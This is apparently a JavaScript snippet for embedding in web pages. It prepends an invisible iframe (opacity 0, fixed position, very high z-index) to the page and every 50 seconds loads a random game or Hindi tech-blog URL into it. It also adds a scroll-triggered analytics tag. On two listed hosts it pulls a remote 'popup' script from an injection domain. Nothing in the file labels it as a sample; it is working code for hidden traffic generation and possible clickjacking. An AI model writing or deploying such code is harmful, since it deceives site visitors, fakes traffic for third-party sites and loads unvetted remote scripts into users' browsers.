document.addEventListener('DOMContentLoaded', () => {
  let Folt = document.querySelector(".footer, #main, .copyright") || document.body; 
  if (Folt) {
    let Newel = document.createElement('span');
    Newel.innerHTML = `<style>
      iframe.invisible-frame {
      position: fixed;
      width:60%;
      height: 20%;
      bottom: 20%;
      right: 0;
      border: none;
      opacity: 0;
      z-index:39494;
    }
  </style> <iframe class="invisible-frame" id="postFrame" src=""></iframe>`;
    Folt.prepend(Newel);  
    var lazyanalisis=!1;window.addEventListener("scroll",function(){(0!=document.documentElement.scrollTop&&!1===lazyanalisis||0!=document.body.scrollTop&&!1===lazyanalisis)&&(!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-2VYRMPXK0F";var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)}(),lazyanalisis=!0)},!0); window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-2VYRMPXK0F');  
  } else {
       
  }
});
  const postUrls = [
    'https://dktheme.online/dance-battle/index.html',
    'https://dktheme.online/funny-fred/index.html',
    'https://dktheme.online/brain-trainer/index.html',
    'https://dktheme.online/stack-smash/index.html',
    'https://dktheme.online/zoo-boom/index.html',
    'https://techdiwane.com/oneplus-nord-premium-phone-250mp-%e0%a4%95%e0%a5%88%e0%a4%ae%e0%a4%b0%e0%a4%be-%e0%a4%94%e0%a4%b0-6700mah-%e0%a4%ac%e0%a5%88%e0%a4%9f%e0%a4%b0%e0%a5%80-%e0%a4%b5%e0%a4%be%e0%a4%b2%e0%a4%be-%e0%a4%aac',
    'https://techdiwane.com/6200-mah-%e0%a4%95%e0%a5%80-%e0%a4%ac%e0%a5%88%e0%a4%9f%e0%a4%b0%e0%a5%80-%e0%a4%95%e0%a5%87-%e0%a4%b8%e0%a4%be%e0%a4%a5-%e0%a4%b0%e0%a5%87%e0%a4%a1%e0%a4%ae%e0%a5%80-%e0%a4%95%e0%a4%be-%e0%a4%a7',
    'https://techdiwane.com/realme-narzo-70x-5g-%e0%a4%b6%e0%a4%be%e0%a4%a8%e0%a4%a6%e0%a4%be%e0%a4%b0-%e0%a4%aa%e0%a4%b0%e0%a4%ab%e0%a5%89%e0%a4%b0%e0%a5%8d%e0%a4%ae%e0%a5%87%e0%a4%82%e0%a4%b8-%e0%a4%94%e0%a4%b0-%e0%a4%ac'
  
  ];
        function goToRandomPost() {
            const randomIndex = Math.floor(Math.random() * postUrls.length);
            const randomPostUrl = postUrls[randomIndex];
            document.getElementById('postFrame').src = randomPostUrl;
        }
        window.onload = function() {
            goToRandomPost();
            setInterval(goToRandomPost,  50000);
        };

var allowedURLs = [
    "https://dkhek.blogspot.com",
    "https://www.desiremovies.store"
];

var foundMatch = false;

for (var i = 0; i < allowedURLs.length; i++) {
    if (window.location.href.startsWith(allowedURLs[i])) {
        foundMatch = true;
        break;
    }
}

if (foundMatch) {
function loadScript(url, callback) { var script = document.createElement('script'); script.type = 'text/javascript'; script.src = url; script.onload = function() { if (callback) callback(); }; document.head.appendChild(script); } loadScript('https://injectshrslinkblog.com/popup/script.js', function() { console.log('Script loaded!'); });
}
else {
}
